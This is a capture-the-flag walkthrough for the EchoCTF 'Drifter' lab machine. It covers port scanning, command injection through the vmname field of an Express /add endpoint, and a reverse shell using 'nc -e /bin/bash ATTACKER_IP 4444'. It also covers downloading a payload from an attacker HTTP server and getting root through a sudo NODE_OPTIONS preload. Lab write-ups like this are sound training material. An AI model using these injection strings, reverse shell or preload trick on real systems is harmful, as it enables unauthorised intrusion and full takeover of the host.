**EchoCTF Drifter Walkthrough**

Below is a concise, step-by-step guide following proper hacking methodology: starting with port enumeration, then service enumeration, source analysis, exploitation, and privilege escalation.

---

## 1. Target Enumeration

1. **Port & Service Discovery**

   ```bash
   nmap -sVC -T4 -Pn -p 1337 <TARGET_IP>
   ```

   * Port 1337 is open, running Node.js with Express middleware.
   * Basic OS fingerprint suggests a Linux host.

2. **Service Banner & HTTP Check**

   ```bash
   curl -I http://<TARGET_IP>:1337
   ```

   * Confirms an Express-powered web server.
   * Standard HTTP headers with status `200 OK`.

---

## 2. Source Analysis & Command Injection

1. **Review the `/add` Endpoint**

   * The web application provides a form that submits to `/add` via `POST`, accepting a single parameter `vmname`.
   * Sample response reveals an attempt to run a `vagrant` command:

     ```json
     {"error": "/bin/sh: 1: vagrant: not found"}
     ```

2. **Identify Injection Point**

   * The backend likely uses:

     ```js
     const { exec } = require('child_process');
     exec(`vagrant ${vmname}`, callback);
     ```

   * Unsanitized input permits shell metacharacter chaining.

---

## 3. Exploiting Command Injection

1. **Confirm Injection**

   ```bash
   curl -s -X POST http://<TARGET_IP>:1337/add \
     -d 'vmname=box; id'
   ```

   * The output of `id` appearing in the HTTP response confirms RCE.

2. **Spawn a Reverse Shell**

   * **On attacker machine**:

     ```bash
     nc -lvnp 4444
     ```

   * **Trigger on target**:

     ```bash
     curl -s -X POST http://<TARGET_IP>:1337/add \
       -d 'vmname=box; nc -e /bin/bash ATTACKER_IP 4444'
     ```

   * You now have an interactive shell as the `ETSCTF` user.

---

## 4. Privilege Escalation via Sudo

1. **Enumerate Sudo Rights**

   ```bash
   sudo -l
   ```

   * Output indicates:

     ```
     (ALL) SETENV: NOPASSWD: /usr/bin/node /app/cli.js
     ```

   * This allows running the Node CLI as root while preserving environment variables.

2. **Exploit with NODE\_OPTIONS Preload**

   * **On your local machine**, create `pwn.js`:

     ```js
     require('child_process').spawnSync('/bin/bash', ['-i'], {stdio: 'inherit'});
     ```

   * Serve it via HTTP:

     ```bash
     python3 -m http.server 8000
     ```

   * **On the target**:

     ```bash
     cd /tmp
     curl http://<ATTACKER_IP>:8000/pwn.js -o pwn.js
     cd /app
     sudo NODE_OPTIONS="--require /tmp/pwn.js" /usr/bin/node /app/cli.js
     ```

   * This loads your script and spawns a root shell.

3. **Verify Root Privileges**

   ```bash
   whoami && id
   ```

   * Confirmed output: `root`.

---

*Happy hacking!*
